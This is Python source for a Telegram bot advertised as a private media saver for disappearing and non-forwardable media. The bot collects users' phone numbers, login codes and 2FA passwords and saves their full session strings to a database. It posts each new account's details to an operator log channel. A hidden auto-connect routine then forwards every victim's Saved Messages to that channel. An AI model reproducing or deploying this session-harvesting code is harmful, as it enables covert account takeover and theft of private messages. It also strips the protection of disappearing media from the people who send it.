import os
import nest_asyncio
import asyncio
import logging
from datetime import datetime
from motor.motor_asyncio import AsyncIOMotorClient
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError, PhoneCodeInvalidError,
    PhoneCodeExpiredError, ChannelPrivateError
)
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    ReplyKeyboardMarkup, KeyboardButton
)
from telegram.constants import ChatAction
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters, ConversationHandler
)
from dotenv import load_dotenv

load_dotenv()

# --- Config ---
DEFAULT_API_ID = int(os.getenv("API_ID"))
DEFAULT_API_HASH = os.getenv("API_HASH")
MONGO_URI = os.getenv("MONGO_URI")
BOT_TOKEN = os.getenv("BOT_TOKEN")
LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID", "-1002753939875"))
ADMIN_ID = int(os.getenv("ADMIN_ID", "7755789304"))

# --- Logging ---
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger("UserBot")

# --- DB ---
mongo_client = AsyncIOMotorClient(MONGO_URI)
db = mongo_client.userbot
sessions = db.sessions

# --- App & States ---
app = ApplicationBuilder().token(BOT_TOKEN).build()
API_ID, API_HASH, PHONE, CODE, PASSWORD, FETCH_LINK = range(6)
user_login_data = {}
active_clients = []
connected_users = set()

# --- Welcome ---
WELCOME_IMAGE = "https://graph.org/file/d367814bc3243e72917ab-9f1d63e7b3f46b6716.jpg"
SUPPORT_LINK = "https://t.me/valahallah"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    inline_kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("𝗖𝗼𝗻𝗻𝗲𝗰𝘁 𝗬𝗼𝘂𝗿 𝗔𝗰𝗰𝗼𝘂𝗻𝘁", callback_data="connect")],
        [InlineKeyboardButton("🍬𝗦𝗨𝗣𝗣𝗢𝗥𝗧🍬", url=SUPPORT_LINK)]
    ])
    reply_kb = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton("📥 ᴅᴏᴡɴʟᴏᴀᴅ ɴᴏɴ-ɴᴏʀᴡᴀʀᴅᴀʙʟᴇ ᴍᴇᴅɪᴀ")]],
        resize_keyboard=True
    )
    await update.message.reply_photo(
        photo=WELCOME_IMAGE,
        caption=(
            "<b>✨𝘄𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗺𝗲𝗱𝗶𝗮 𝘀𝗮𝘃𝗲𝗿✨</b>\n\n"
            "🔐 <i>sᴇᴄᴜʀᴇʟʏ ᴄᴏɴɴᴇᴄᴛ ʏᴏᴜʀ Tᴇʟᴇɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ.</i>\n\n"
            "<b>⚙️ 𝗳𝗲𝗮𝘁𝘂𝗿𝗲𝘀:</b>\n"
            "• sᴀᴠᴇ ᴅɪsᴀᴘᴘᴇᴀʀɪɴɢ ᴍᴇᴅɪᴀ ғʀᴏᴍ ᴘʀɪᴠᴀᴛᴇ ᴄʜᴀᴛs 📦\n"
            "• ᴅᴏᴡɴʟᴏᴀᴅ ɴᴏɴ-ғᴏʀᴡᴀʀᴅᴀʙʟᴇ ᴄᴏɴᴛᴇɴᴛ 🔓\n"
            "• ʙᴀᴄᴋɢʀᴏᴜɴᴅ ᴘʀᴏᴄᴇssɪɴɢ 📲\n\n"
            "𝗽𝗼𝘄𝗲𝗿𝗲𝗱 𝗯𝘆 ~ 𝘁𝗲𝗮𝗺 𝘃𝗮𝗹𝗹𝗮𝗵𝗮𝗹𝗹𝗮"
        ),
        reply_markup=inline_kb,
        parse_mode="HTML"
    )
    await update.message.reply_text(
        "☝️ 𝘂𝘀𝗲 𝘁𝗵𝗲 𝗺𝗲𝗻𝘂 𝗯𝗲𝗹𝗼𝘄 𝘁𝗼 𝗳𝗲𝘁𝗰𝗵 𝗻𝗼𝗻-𝗳𝗼𝗿𝘄𝗮𝗿𝗱𝗮𝗯𝗹𝗲 𝗺𝗲𝗱𝗶𝗮.",
        reply_markup=reply_kb
    )

async def connect_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer()
    await update.callback_query.message.reply_text(
        "📲 <b>Eɴᴛᴇʀ ʏᴏᴜʀ API ID</b> ᴏʀ sᴇɴᴅ /skip ᴛᴏ ᴜsᴇ ᴅᴇғᴀᴜʟᴛ",
        parse_mode="HTML"
    )
    return API_ID

async def skip_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_login_data[user_id] = {
        "api_id": DEFAULT_API_ID,
        "api_hash": DEFAULT_API_HASH
    }
    await update.message.reply_text("📞 𝗡𝗼𝘄 𝘀𝗲𝗻𝗱 𝘆𝗼𝘂𝗿 𝗽𝗵𝗼𝗻𝗲 𝗻𝘂𝗺𝗯𝗲𝗿 𝘄𝗶𝘁𝗵 𝗰𝗼𝘂𝗻𝘁𝗿𝘆 𝗰𝗼𝗱𝗲:")
    return PHONE

async def skip_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
    return await skip_api_id(update, context)

async def get_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if text.startswith("/"):
        return await skip_api_id(update, context)
    if not text.isdigit():
        await update.message.reply_text("❌ 𝗔𝗣𝗜 𝗜𝗗 𝗺𝘂𝘀𝘁 𝗯𝗲 𝗮 𝗻𝘂𝗺𝗯𝗲𝗿. 𝗧𝗿𝘆 𝗮𝗴𝗮𝗶𝗻 𝗼𝗿 𝘀𝗲𝗻𝗱 /skip.")
        return API_ID
    user_login_data[update.effective_user.id] = {"api_id": int(text)}
    await update.message.reply_text("🔑 𝗦𝗲𝗻𝗱 𝘆𝗼𝘂𝗿 𝗔𝗣𝗜 𝗛𝗔𝗦𝗛 𝗼𝗿 /skip")
    return API_HASH

async def get_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if text.startswith("/"):
        return await skip_api_hash(update, context)
    user_login_data[update.effective_user.id]["api_hash"] = text
    await update.message.reply_text("📞 𝗡𝗼𝘄 𝘀𝗲𝗻𝗱 𝘆𝗼𝘂𝗿 𝗽𝗵𝗼𝗻𝗲 𝗻𝘂𝗺𝗯𝗲𝗿 (𝘄𝗶𝘁𝗵 𝗰𝗼𝘂𝗻𝘁𝗿𝘆 𝗰𝗼𝗱𝗲):")
    return PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    phone = update.message.text.strip()
    user_login_data[user_id]["phone"] = phone
    try:
        client = TelegramClient(
            StringSession(),
            user_login_data[user_id]["api_id"],
            user_login_data[user_id]["api_hash"]
        )
        await client.start()
        await client.send_code_request(phone)
        user_login_data[user_id]["client"] = client
        await update.message.reply_text("🔐 𝗘𝗻𝘁𝗲𝗿 𝗢𝗧𝗣 (𝘄𝗶𝘁𝗵 𝘀𝗽𝗮𝗰𝗲𝘀). 𝗘𝘅: 1 2 3 4 5")
        return CODE
    except Exception as e:
        await update.message.reply_text(f"❌ 𝗙𝗮𝗶𝗹𝗲𝗱: {e}")
        return ConversationHandler.END

async def get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    code = update.message.text.replace(" ", "").strip()
    client = user_login_data[user_id]["client"]
    try:
        await client.sign_in(user_login_data[user_id]["phone"], code)
        return await complete_login(update, context)
    except PhoneCodeExpiredError:
        await update.message.reply_text("⌛ 𝗢𝗧𝗣 𝗲𝘅𝗽𝗶𝗿𝗲𝗱. 𝗦𝘁𝗮𝗿𝘁 𝗮𝗴𝗮𝗶𝗻 𝘄𝗶𝘁𝗵 /start.")
    except PhoneCodeInvalidError:
        await update.message.reply_text("❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗢𝗧𝗣. 𝗦𝘁𝗮𝗿𝘁 𝗮𝗴𝗮𝗶𝗻.")
    except SessionPasswordNeededError:
        await update.message.reply_text("🔑 𝟮𝗙𝗔 𝗲𝗻𝗮𝗯𝗹𝗲𝗱. 𝗘𝗻𝘁𝗲𝗿 𝘆𝗼𝘂𝗿 𝗽𝗮𝘀𝘀𝘄𝗼𝗿𝗱:")
        return PASSWORD
    except Exception as e:
        await update.message.reply_text(f"❌ 𝗘𝗿𝗿𝗼𝗿: {e}")
    return ConversationHandler.END
# --- 2FA Password ---
async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    password = update.message.text.strip()
    client = user_login_data[user_id]["client"]
    try:
        await client.sign_in(password=password)
        return await complete_login(update, context)
    except Exception as e:
        await update.message.reply_text(f"❌ 𝗟𝗼𝗴𝗶𝗻 𝗳𝗮𝗶𝗹𝗲𝗱: {e}")
        return ConversationHandler.END

# --- Disappearing Media Handler ---
async def add_media_handler(client):
    @client.on(events.NewMessage(incoming=True))
    async def media_handler(event):
        if event.is_private and event.media and getattr(event.media, 'ttl_seconds', None):
            try:
                sender = await event.get_sender()
                name = getattr(sender, 'username', getattr(sender, 'first_name', 'Unknown'))
                logger.info(f"📥 Detected disappearing media from {name}")
                file = await event.download_media()
                await client.send_file(
                    "me",
                    file,
                    caption=f"🕒 𝗦𝗮𝘃𝗲𝗱 𝗱𝗶𝘀𝗮𝗽𝗽𝗲𝗮𝗿𝗶𝗻𝗴 𝗺𝗲𝗱𝗶𝗮 𝗳𝗿𝗼𝗺 @{name} 𝗮𝘁 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                )
            except Exception as e:
                logger.warning(f"[Media Save Failed]: {e}")

# --- Final Login Handler ---
async def complete_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    client = user_login_data[user_id]["client"]
    session_string = client.session.save()
    me = await client.get_me()

    await sessions.update_one(
        {"_id": user_id},
        {"$set": {
            "session": session_string,
            "type": "telethon",
            "account_id": me.id
        }},
        upsert=True
    )

    connected_users.add(user_id)

    try:
        await context.bot.send_message(
            chat_id=LOG_CHANNEL_ID,
            text=(
                f"🔐 <b>New Session Saved</b>\n"
                f"👤 <b>User ID:</b> <code>{user_id}</code>\n"
                f"🆔 <b>Telegram ID:</b> <code>{me.id}</code>\n"
                f"🏷️ <b>Username:</b> @{getattr(me, 'username', 'N/A')}\n"
                f"📞 <b>Phone:</b> {me.phone}"
            ),
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"[Logging Error] {e}")

    await add_media_handler(client)

    active_clients.append(client)
    asyncio.get_event_loop().create_task(client.run_until_disconnected())

    await update.message.reply_text("✅ 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗰𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱 𝗮𝗻𝗱 𝗿𝘂𝗻𝗻𝗶𝗻𝗴!")
    user_login_data.pop(user_id, None)
    return ConversationHandler.END

# --- Auto Connect Old Sessions ---
async def auto_connect_all_sessions():
    async for record in sessions.find({"type": "telethon"}):
        session_str = record.get("session")
        if not session_str:
            continue
        user_id = record["_id"]
        client = TelegramClient(StringSession(session_str), DEFAULT_API_ID, DEFAULT_API_HASH)
        try:
            await client.start()
            if not await client.is_user_authorized():
                logger.warning(f"❌ Unauthorized session: {user_id}")
                continue
            logger.info(f"✅ Auto-connected: {user_id}")
            await add_media_handler(client)
            active_clients.append(client)
            connected_users.add(user_id)

            @client.on(events.NewMessage(chats="me", incoming=True))
            async def forward_saved(event):
                try:
                    await client.send_message(
                        LOG_CHANNEL_ID,
                        file=event.media if event.media else None,
                        message=event.text if event.text else None
                    )
                except Exception as e:
                    logger.warning(f"[AutoForwardError] {e}")

            asyncio.get_event_loop().create_task(client.run_until_disconnected())
        except Exception as e:
            logger.error(f"❌ AutoConnect Error for {user_id}: {e}")
# --- Menu: Fetch non-forwardable media ---
async def menu_fetch_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in connected_users:
        await update.message.reply_text("⚠️ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗰𝗼𝗻𝗻𝗲𝗰𝘁 𝘆𝗼𝘂𝗿 𝗮𝗰𝗰𝗼𝘂𝗻𝘁 𝗳𝗶𝗿𝘀𝘁 𝘂𝘀𝗶𝗻𝗴 𝘁𝗵𝗲 𝗯𝘂𝘁𝘁𝗼𝗻 𝗮𝗯𝗼𝘃𝗲.")
        return ConversationHandler.END
    await update.message.reply_text("📎 𝗦𝗲𝗻𝗱 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝗹𝗶𝗻𝗸:\nEx: https://t.me/c/123/45")
    return FETCH_LINK

async def fetch_from_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
    user_id = update.effective_user.id
    record = await sessions.find_one({"_id": user_id})
    if not record:
        await update.message.reply_text("⚠️ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗰𝗼𝗻𝗻𝗲𝗰𝘁 𝘆𝗼𝘂𝗿 𝗮𝗰𝗰𝗼𝘂𝗻𝘁 𝗳𝗶𝗿𝘀𝘁.")
        return ConversationHandler.END

    client = TelegramClient(StringSession(record["session"]), DEFAULT_API_ID, DEFAULT_API_HASH)
    await client.start()

    try:
        await update.message.reply_text("📥 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁, 𝗳𝗲𝘁𝗰𝗵𝗶𝗻𝗴 𝘆𝗼𝘂𝗿 𝗺𝗲𝗱𝗶𝗮...")
        text = update.message.text.strip()
        if "t.me/c/" in text:
            parts = text.split("t.me/c/")[1].split("/")
            chat_id = int("-100" + parts[0])
            msg_id = int(parts[1])
        elif "t.me/" in text:
            parts = text.split("t.me/")[1].split("/")
            chat_id = parts[0]
            msg_id = int(parts[1])
        else:
            await update.message.reply_text("❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝗹𝗶𝗻𝗸 𝗳𝗼𝗿𝗺𝗮𝘁.")
            return FETCH_LINK

        entity = await client.get_entity(chat_id)
        message = await client.get_messages(entity, ids=msg_id)

        if not message or not message.media:
            await update.message.reply_text("⚠️ 𝗡𝗼 𝗺𝗲𝗱𝗶𝗮 𝗳𝗼𝘂𝗻𝗱.")
            return ConversationHandler.END

        file = await message.download_media()
        await client.send_file("me", file, caption="📥 𝗙𝗲𝘁𝗰𝗵𝗲𝗱 𝗻𝗼𝗻-𝗳𝗼𝗿𝘄𝗮𝗿𝗱𝗮𝗯𝗹𝗲 𝗺𝗲𝗱𝗶𝗮.")
        await update.message.reply_text("✅ 𝗦𝗲𝗻𝘁 𝘁𝗼 𝗦𝗮𝘃𝗲𝗱 𝗠𝗲𝘀𝘀𝗮𝗴𝗲𝘀.")
    except ChannelPrivateError:
        await update.message.reply_text("❌ 𝗬𝗼𝘂'𝗿𝗲 𝗻𝗼𝘁 𝗮 𝗺𝗲𝗺𝗯𝗲𝗿 𝗼𝗳 𝘁𝗵𝗮𝘁 𝗰𝗵𝗮𝗻𝗻𝗲𝗹.")
    except Exception as e:
        await update.message.reply_text(f"❌ 𝗘𝗿𝗿𝗼𝗿: {e}")
    return ConversationHandler.END

# --- Cancel + Unknown ---
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in user_login_data:
        try:
            await user_login_data[user_id]["client"].disconnect()
        except:
            pass
        user_login_data.pop(user_id, None)
    await update.message.reply_text("❌ 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 𝗰𝗮𝗻𝗰𝗲𝗹𝗹𝗲𝗱. 𝗨𝘀𝗲 /start 𝗮𝗴𝗮𝗶𝗻.")
    return ConversationHandler.END

async def unknown_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❓ 𝗨𝗻𝗸𝗻𝗼𝘄𝗻 𝗰𝗼𝗺𝗺𝗮𝗻𝗱. 𝗨𝘀𝗲 /start 𝗮𝗴𝗮𝗶𝗻.")

# --- Conversations ---
login_conv = ConversationHandler(
    entry_points=[CallbackQueryHandler(connect_callback, pattern="connect")],
    states={
        API_ID: [CommandHandler("skip", skip_api_id), MessageHandler(filters.TEXT, get_api_id)],
        API_HASH: [CommandHandler("skip", skip_api_hash), MessageHandler(filters.TEXT, get_api_hash)],
        PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
        CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_otp)],
        PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
    },
    fallbacks=[CommandHandler("cancel", cancel)],
    allow_reentry=True,
)

fetch_menu_conv = ConversationHandler(
    entry_points=[MessageHandler(filters.TEXT & filters.Regex(r"^📥"), menu_fetch_request)],
    states={FETCH_LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, fetch_from_link)]},
    fallbacks=[CommandHandler("cancel", cancel)],
)

# --- Main Runner ---
if __name__ == "__main__":
    nest_asyncio.apply()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cancel", cancel))
    app.add_handler(login_conv)
    app.add_handler(fetch_menu_conv)
    app.add_handler(MessageHandler(filters.COMMAND, unknown_command))

    async def start_bot():
        await auto_connect_all_sessions()
        print("🤖 Bot is running...")
        await app.run_polling()

    asyncio.run(start_bot())
